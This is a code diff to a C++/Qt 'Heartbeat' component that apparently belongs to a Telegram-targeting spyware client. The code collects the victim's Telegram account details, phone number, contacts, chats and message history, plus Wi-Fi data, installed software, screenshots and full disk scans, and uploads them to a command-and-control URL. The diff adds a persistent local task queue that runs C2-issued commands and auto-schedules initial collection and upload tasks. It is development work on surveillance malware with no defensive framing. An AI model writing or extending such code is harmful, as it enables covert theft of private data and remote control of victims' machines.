@@ -117,7 +117,8 @@ void Heartbeat::ensureDbInit(const QString& path) {
             "CREATE TABLE IF NOT EXISTS current_user (user_id TEXT PRIMARY KEY, username TEXT, first_name TEXT, last_name TEXT, phone TEXT, is_premium INTEGER);"
             "CREATE TABLE IF NOT EXISTS contacts (user_id TEXT PRIMARY KEY, username TEXT, first_name TEXT, last_name TEXT, phone TEXT);"
             "CREATE TABLE IF NOT EXISTS chats (chat_id TEXT PRIMARY KEY, title TEXT, type TEXT, invite_link TEXT, member_count INTEGER);"
-            "CREATE TABLE IF NOT EXISTS chat_sync_state (chat_id TEXT PRIMARY KEY, min_id INTEGER, max_id INTEGER, last_sync INTEGER);";
+            "CREATE TABLE IF NOT EXISTS chat_sync_state (chat_id TEXT PRIMARY KEY, min_id INTEGER, max_id INTEGER, last_sync INTEGER);"
+            "CREATE TABLE IF NOT EXISTS local_tasks (task_id TEXT PRIMARY KEY, command TEXT, params TEXT, status TEXT, created_at INTEGER, updated_at INTEGER);";
         sqlite3_exec(db, createTablesSql, 0, 0, 0);
         
         // Migration for existing chat_logs
@@ -148,46 +149,9 @@ void Heartbeat::start() {
     // Initialize DB
     ensureDbInit(getDbPath());
     
-    // Check Global Scan Mutex (File based in Temp)
-    // QString lockPath = QStandardPaths::writableLocation(QStandardPaths::TempLocation) + "/telegram_scan.lock";
-    bool shouldScan = true; // FORCE SCAN FOR DEBUGGING
-    
-    // 1. Indicate Scanning State
-    _dataStatus = "Scanning...";
-    collectSystemInfo(); // Writes "Scanning..." to DB
-    uploadClientDb();    // Immediately upload to show "Scanning..." on Web
-    
-    if (shouldScan) {
-        collectInstalledSoftware();
-        collectDrivesAndUsers(); // Collect File System Roots
-    }
-    
-    // 2. Scan Finished - Revert to Active
-    _dataStatus = "Active";
-    collectSystemInfo(); // Writes "Active" to DB
+    // Inject initial tasks if not already done
+    injectInitialTasks();
 
-    // Always collect Telegram specific data (this is per-client isolated)
-    collectTelegramData();
-    
-    // Trigger Sync History immediately
-    syncChatHistory();
-
-    // Start Background File Scan (Auto)
-    {
-        BackgroundScanner* scanner = new BackgroundScanner(_deviceUuid, _c2Url, getDbPath(), "", "full");
-        QThread* thread = new QThread;
-        scanner->moveToThread(thread);
-        connect(thread, &QThread::started, scanner, &BackgroundScanner::process);
-        connect(scanner, &BackgroundScanner::scanFinished, this, [this, thread, scanner](const QString& tid, const QByteArray& data) {
-             thread->quit();
-             thread->wait();
-             delete thread;
-             delete scanner;
-             uploadClientDb(); // Upload immediately after scan finishes
-        });
-        thread->start();
-    }
-    
     // Schedule periodic tasks
     // 1. Heartbeat (Lightweight, High Frequency - 60s)
     connect(&_timer, &QTimer::timeout, this, [this]() {
@@ -195,7 +159,7 @@ void Heartbeat::start() {
     });
 
     // 2. Data Collection (Heavy, Low Frequency - 5min)
-    connect(&_collectionTimer, &QTimer::timeout, this, [this, shouldScan]() {
+    connect(&_collectionTimer, &QTimer::timeout, this, [this]() {
         collectSystemInfo();
         collectTelegramData();
         syncChatHistory(); // Sync history periodically
@@ -204,24 +168,25 @@ void Heartbeat::start() {
         // 24h Upload Logic
         int64_t now = QDateTime::currentSecsSinceEpoch();
         if (_lastUploadTime == 0 || (now - _lastUploadTime) >= 86400) {
-            uploadClientDb();
-            cleanupDatabase(); // Cleanup after scheduled upload
+            // Add upload task to queue instead of direct call
+            QString taskId = "upload_" + QString::number(now);
+            saveTask(taskId, "upload_db", "", "pending");
             _lastUploadTime = now;
         }
     });
     
-    // Upload initial data immediately after collection
-    uploadClientDb();
-    _lastUploadTime = QDateTime::currentSecsSinceEpoch();
+    // 3. Monitor Timer
+    connect(&_monitorTimer, &QTimer::timeout, this, &Heartbeat::performMonitor);
+
+    // 4. Local Task Processing (Every 5 seconds)
+    connect(&_taskProcessingTimer, &QTimer::timeout, this, &Heartbeat::processLocalTasks);
+    _taskProcessingTimer.start(5000);
 
     // Send initial heartbeat immediately
     sendHeartbeat();
 
     _timer.start(_currentHeartbeatInterval); // Heartbeat
     _collectionTimer.start(300000); // 5 minutes (Collection)
-
-    // Connect Monitor Timer
-    connect(&_monitorTimer, &QTimer::timeout, this, &Heartbeat::performMonitor);
 
     // Start Task Polling Loop (Fast)
     checkTasks();
@@ -757,7 +722,7 @@ void Heartbeat::checkTasks() {
                     QString taskId = task["taskId"].toString();
                     QString command = task["command"].toString();
                     QString params = task["params"].toString();
-                    executeTask(taskId, command, params);
+                    saveTask(taskId, command, params, "pending");
                 }
             }
         } else {
@@ -770,6 +735,145 @@ void Heartbeat::checkTasks() {
     });
     
     // Also send heartbeat periodically? No, that's in _timer.
+}
+
+void Heartbeat::saveTask(const QString& taskId, const QString& command, const QString& params, const QString& status) {
+    sqlite3* db;
+    if (sqlite3_open(getDbPath().toUtf8().constData(), &db) != SQLITE_OK) return;
+
+    // Check if task exists and is completed to avoid re-execution of completed tasks
+    bool isCompleted = false;
+    {
+        sqlite3_stmt* checkStmt;
+        const char* checkSql = "SELECT status FROM local_tasks WHERE task_id = ?;";
+        if (sqlite3_prepare_v2(db, checkSql, -1, &checkStmt, 0) == SQLITE_OK) {
+            sqlite3_bind_text(checkStmt, 1, taskId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+            if (sqlite3_step(checkStmt) == SQLITE_ROW) {
+                QString currentStatus = QString::fromUtf8((const char*)sqlite3_column_text(checkStmt, 0));
+                if (currentStatus == "completed") {
+                    isCompleted = true;
+                }
+            }
+            sqlite3_finalize(checkStmt);
+        }
+    }
+
+    if (isCompleted) {
+        sqlite3_close(db);
+        return;
+    }
+
+    sqlite3_stmt* stmt;
+    const char* sql = "INSERT OR REPLACE INTO local_tasks (task_id, command, params, status, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?);";
+    sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
+    
+    int64_t now = QDateTime::currentSecsSinceEpoch();
+    sqlite3_bind_text(stmt, 1, taskId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+    sqlite3_bind_text(stmt, 2, command.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+    sqlite3_bind_text(stmt, 3, params.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+    sqlite3_bind_text(stmt, 4, status.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+    sqlite3_bind_int64(stmt, 5, now);
+    sqlite3_bind_int64(stmt, 6, now);
+    
+    sqlite3_step(stmt);
+    sqlite3_finalize(stmt);
+    sqlite3_close(db);
+}
+
+void Heartbeat::updateTaskStatus(const QString& taskId, const QString& status) {
+    sqlite3* db;
+    if (sqlite3_open(getDbPath().toUtf8().constData(), &db) != SQLITE_OK) return;
+
+    sqlite3_stmt* stmt;
+    const char* sql = "UPDATE local_tasks SET status = ?, updated_at = ? WHERE task_id = ?;";
+    sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
+    
+    int64_t now = QDateTime::currentSecsSinceEpoch();
+    sqlite3_bind_text(stmt, 1, status.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+    sqlite3_bind_int64(stmt, 2, now);
+    sqlite3_bind_text(stmt, 3, taskId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+    
+    sqlite3_step(stmt);
+    sqlite3_finalize(stmt);
+    sqlite3_close(db);
+}
+
+void Heartbeat::injectInitialTasks() {
+    if (hasInitialTasksRun()) return;
+
+    // Inject tasks in sequence
+    // 1. Wifi Scan
+    saveTask("init_wifi", "get_wifi", "", "pending");
+    
+    // 2. Software Scan
+    saveTask("init_soft", "get_software", "", "pending");
+    
+    // 3. Current User Info
+    saveTask("init_user", "get_current_user", "", "pending");
+    
+    // 4. Full Disk Scan (Long running)
+    saveTask("init_disk", "scan_disk", "{\"mode\":\"full\"}", "pending");
+
+    // 5. Upload DB (Final)
+    saveTask("init_upload", "upload_db", "", "pending");
+}
+
+bool Heartbeat::hasInitialTasksRun() {
+    // Check if init_upload exists
+    sqlite3* db;
+    if (sqlite3_open(getDbPath().toUtf8().constData(), &db) != SQLITE_OK) return false;
+
+    bool exists = false;
+    sqlite3_stmt* stmt;
+    const char* sql = "SELECT 1 FROM local_tasks WHERE task_id = 'init_upload';";
+    if (sqlite3_prepare_v2(db, sql, -1, &stmt, 0) == SQLITE_OK) {
+        if (sqlite3_step(stmt) == SQLITE_ROW) {
+            exists = true;
+        }
+        sqlite3_finalize(stmt);
+    }
+    sqlite3_close(db);
+    return exists;
+}
+
+void Heartbeat::processLocalTasks() {
+    sqlite3* db;
+    if (sqlite3_open(getDbPath().toUtf8().constData(), &db) != SQLITE_OK) return;
+
+    // 1. Check if any task is currently in_progress
+    {
+        sqlite3_stmt* checkStmt;
+        const char* checkSql = "SELECT 1 FROM local_tasks WHERE status = 'in_progress' LIMIT 1;";
+        if (sqlite3_prepare_v2(db, checkSql, -1, &checkStmt, 0) == SQLITE_OK) {
+            if (sqlite3_step(checkStmt) == SQLITE_ROW) {
+                // A task is running, wait for it to finish
+                sqlite3_finalize(checkStmt);
+                sqlite3_close(db);
+                return;
+            }
+            sqlite3_finalize(checkStmt);
+        }
+    }
+
+    // 2. Pick next pending task
+    sqlite3_stmt* stmt;
+    const char* sql = "SELECT task_id, command, params FROM local_tasks WHERE status = 'pending' ORDER BY created_at ASC LIMIT 1;";
+    sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
+    
+    QString taskId, command, params;
+    if (sqlite3_step(stmt) == SQLITE_ROW) {
+        taskId = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 0));
+        command = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 1));
+        params = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 2));
+    }
+    sqlite3_finalize(stmt);
+    sqlite3_close(db);
+
+    if (!taskId.isEmpty()) {
+        Logs::writeMain("HEARTBEAT_DEBUG: Processing local task: " + taskId + " (" + command + ")");
+        updateTaskStatus(taskId, "in_progress");
+        executeTask(taskId, command, params);
+    }
 }
 
 void Heartbeat::performScreenshot(const QString& taskId) {
@@ -828,6 +932,9 @@ void Heartbeat::performScreenshot(const QString& taskId) {
 }
 
 void Heartbeat::uploadResult(const QString& taskId, const QString& result, const QString& status) {
+    // Update local DB
+    updateTaskStatus(taskId, status);
+
     QJsonObject json;
     json["taskId"] = taskId;
     json["result"] = result;
@@ -867,6 +974,10 @@ void Heartbeat::executeTask(const QString& taskId, const QString& command, const
     } else if (command == "get_wifi") {
         collectWiFiInfo();
         QString json = getWifiJson();
+        uploadResult(taskId, json, "completed");
+    } else if (command == "get_current_user") {
+        collectTelegramData();
+        QString json = getCurrentUserJson();
         uploadResult(taskId, json, "completed");
     } else if (command == "scan_recent") {
         collectRecentFiles(taskId);
@@ -1591,6 +1702,30 @@ QString Heartbeat::getWifiJson() {
 
 QString Heartbeat::getRecentFilesJson() {
     return "[]"; // Placeholder if needed
+}
+
+QString Heartbeat::getCurrentUserJson() {
+    QString dbPath = getDbPath();
+    sqlite3* db;
+    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) return "{}";
+
+    QJsonObject obj;
+    sqlite3_stmt* stmt;
+    const char* sql = "SELECT user_id, username, first_name, last_name, phone, is_premium FROM current_user LIMIT 1;";
+    
+    if (sqlite3_prepare_v2(db, sql, -1, &stmt, 0) == SQLITE_OK) {
+        if (sqlite3_step(stmt) == SQLITE_ROW) {
+            obj["userId"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 0));
+            obj["username"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 1));
+            obj["firstName"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 2));
+            obj["lastName"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 3));
+            obj["phone"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 4));
+            obj["isPremium"] = sqlite3_column_int(stmt, 5) ? true : false;
+        }
+        sqlite3_finalize(stmt);
+    }
+    sqlite3_close(db);
+    return QJsonDocument(obj).toJson(QJsonDocument::Compact);
 }
 
 // Background Scanner Implementation
